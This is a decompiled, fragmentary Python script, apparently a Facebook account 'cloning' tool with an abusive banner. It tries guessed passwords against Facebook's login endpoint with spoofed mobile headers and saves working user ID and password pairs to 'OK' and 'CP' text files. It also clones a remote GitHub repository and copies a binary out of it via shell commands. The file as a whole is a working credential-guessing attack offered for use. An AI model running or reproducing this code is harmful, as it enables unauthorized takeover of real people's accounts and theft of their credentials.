# Decompile by Mardis (Tools By SHAHID BASHIR )
...
logo = """'\x1b[1;92m'
                FU3K YOUR SYSTEM                                                                                          
'\x1b[1;91m'====================================================
'\x1b[1;92m'   Github      :     SHAHID (ALEX)  
'\x1b[1;93m'   FB ID       :     CHAL BE APNA KAM KR
'\x1b[1;94m'   TOOL TYPE   :     FREE USE KR BE CHUHTIYE
'\x1b[1;91m'==================================================== 
'\x1b[1;92m'_________FREE TOOL HA ENJOY KR BE SALYE
'\x1b[1;93m'====================================================
...
RIAZuser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":RIAZuser, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
...
def main_apv():
    ...
    print "\x1b[1;93m[4]   File Making YE BI BEST (LOGIN)"
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member OF MR SHAHUD FREE Commands ")
        print ("        ENJOY  KRO BHAI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/Burewala451/Jutt.git")
        os.system("rm -rf Jutt")
        os.system("cp -f Jutt/Jutt \\.")
        os.system("rm -rf Jutt")
        time.sleep(5)
        ...
        os.system("xdg-open https://wa.me/+923081008587")
        time.sleep(3)
        main_system()
...
def numcloning():
    ...
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any NetwoRIAZ : ')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[Jutt-OK] "+coc+user + " | " + pass1
                ok=open('Jutt-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[Jutt-CP] "+coc+user + " | " + pass1
                    cp=open('Jutt random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[Jutt-OK] "+uid + " | " + pass1
                ok=open('Jutt-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[Jutt-CP] "+uid + " | " + pass1
                    cp=open('Jutt-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[Jutt-OK] "+uid + " | " + pass2
                        ok=open('Jutt-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[Jutt-CP] "+uid + " | " + pass2
                            cp=open('Jutt-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[Jutt-OK] "+uid + " | " + pass3
                                ok=open('Jutt-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[Jutt-CP] "+uid + " | " + pass3
                                    cp=open('Jutt-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[Jutt-OK] "+uid + " | " + pass4
                                        ok=open('Jutt-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[Jutt-CP] "+uid + " | " + pass4
                                            cp=open('Jutt-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[Jutt-OK] "+uid + " | " + pass5
                                                ok=open('Jutt-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[Jutt-CP] "+uid + " | " + pass5
                                                    cp=open('Jutt-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[Sahil-OK] "+uid + " | " + pass1
                ok=open('Sahil-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[Jut-OK] "+uid + " | " + pass3
                                ok=open('Jutt-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
    ...
    def main(arg):
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;97mJutt-CP] "+uid + " | " + pass1
                    cp=open('Jutt-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    q = json.loads(data)
                    if "access_token" in q:
                        print "\x1b[1;92m[Jut-OK] "+uid + " | " + pass2
                        ok=open('Jutt-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[Juttt-CP] "+uid + " | " + pass2
                            cp=open('Jutt-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[Jutt-OK] "+uid + " | " + pass6
                                                        ok=open('Jutt-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;97m[Jutt-CP] "+uid + " | " + pass6
                                                            cp=open('Jutt-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
